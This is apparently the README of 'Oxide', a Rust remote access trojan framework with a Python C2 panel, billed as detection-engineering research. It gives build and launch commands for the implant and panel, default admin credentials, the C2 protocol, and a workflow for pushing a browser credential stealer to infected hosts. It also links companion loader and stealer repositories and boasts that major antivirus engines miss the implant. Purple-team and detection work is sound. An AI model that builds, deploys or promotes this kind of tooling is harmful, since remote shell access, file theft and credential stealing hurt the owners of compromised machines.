# Oxide

Cross-platform RAT framework for security research and detection engineering.

Built to demonstrate threat actor TTPs at the code level. Every component ships
with paired YARA rules, Sigma rules, network signatures, and IR playbooks.

**All testing occurs in an isolated VM lab (host-only network, no internet bridge).**
Default C2 address is localhost. See `DISCLAIMER.md`.

---

## What This Is

A reference implementation of a modern RAT framework used to:
- Understand implant-panel communication at the protocol level
- Build detection rules against known behaviour, not guesswork
- Run purple team exercises with documented attack and defend artifacts

Reference architecture: AsyncRAT (C#, 2019). Oxide modernises it: Rust implant,
cross-platform persistence, web panel, staged loader, standalone stealer.

---

## Components

| Repo | Role | Language |
|------|------|----------|
| [oxide](https://github.com/diemoeve/oxide) (this) | Implant + C2 panel + detection | Rust + Python |
| [oxide-loader](https://github.com/diemoeve/oxide-loader) | 3-stage delivery chain | C + Rust |
| [oxide-stealer](https://github.com/diemoeve/oxide-stealer) | Browser credential extraction | Rust |
| [oxide-infra](https://github.com/diemoeve/oxide-infra) | Lab infrastructure automation | Terraform + Ansible |

---

## Quick Start (Lab)

**Prerequisites:** Rust stable, Python 3.11+, libvirt/KVM, gcc

```bash
bash lab-setup/gen_certs.sh
cargo build -p oxide-implant
cd panel && pip install -e . && python -m panel.panel.main --web-port 8080 --c2-port 4444
OXIDE_C2_HOST=10.10.100.1 ./target/debug/oxide-implant
```

Open `http://localhost:8080` (admin / oxide).

---

## Protocol

`[4-byte LE length][AES-256-GCM encrypted JSON]` over TLS 1.3.

Command types: `shell`, `file_list`, `file_download`, `screenshot`,
`process_list`, `persist_status`, `persist_remove`, `steal`.

---

## Steal Command

1. Upload oxide-stealer binary: `POST /api/staging/upload` (no stage_number)
2. Click **Steal** in the panel bot detail view
3. Implant downloads binary from staging, validates SHA-256, executes as subprocess
4. Credentials appear in the **Credentials** tab

---

## Detection

All techniques in `detection/COVERAGE_MATRIX.md`.

```
detection/
├── sigma/          15 rules: persistence, commands, C2, credential access, tool staging
├── yara/           3 rules
├── network/        Zeek, Suricata, JA3/JA4
└── ir/             5 IR playbooks
```

---

## Tests

```bash
cargo test
pytest panel/tests/ -v
pytest tests/vm/ -v   # requires VMs (see tests/vm/README.md)
```

---

## Structure

```
oxide/
├── implant/    Rust implant
├── shared/     Shared crypto + packet types
├── panel/      Python/FastAPI C2 panel
├── detection/  YARA, Sigma, network, IR
├── docs/       Architecture and protocol docs
├── tests/vm/   VM integration tests (libvirt)
└── lab-setup/  Certificate generation
```

---

## Related

- [oxide-loader](https://github.com/diemoeve/oxide-loader) - 3-stage delivery chain
- [oxide-stealer](https://github.com/diemoeve/oxide-stealer) - Browser credential extraction
- [oxide-infra](https://github.com/diemoeve/oxide-infra) - Lab infrastructure (Terraform + Ansible)

---

## VirusTotal

| Binary | Detections | Link |
|--------|------------|------|
| oxide-implant (Windows x86_64) | 5/72 | [scan](https://www.virustotal.com/gui/file/69ba7de6d505dbf6c655895718e65d49088f673a7a798177bd5c3fe9eef4744d) |

All 5 detections are from heuristic/ML engines (Bkav Pro, Webroot, and similar) known for false positives on unsigned Rust PE binaries. No signature-based or behavioral detection from Defender, Kaspersky, ESET, CrowdStrike, SentinelOne, or other major engines.

Reference binary SHA256: `69ba7de6d505dbf6c655895718e65d49088f673a7a798177bd5c3fe9eef4744d`
Rebuilds from source will not match this hash (Rust builds are not reproducible by default).
